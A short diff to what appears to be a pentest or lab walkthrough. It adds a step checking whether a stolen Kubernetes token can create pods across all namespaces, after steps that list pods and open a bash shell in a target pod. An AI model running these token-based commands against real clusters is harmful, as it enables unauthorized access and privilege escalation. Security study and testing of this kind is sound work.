@@ -9,3 +9,5 @@
 #### 2) kubectl get pods --token={TOKEN}
 
 #### 3) kubectl exec -it POD --token={TOKEN} -- /bin/bash (This gives us a shell on the target pod)
+
+#### 4) kubectl --token=TOKEN --certificate-authority=ca.crt --server=https://IP_ADDRESS:8443 auth can-i create pods --all-namespaces
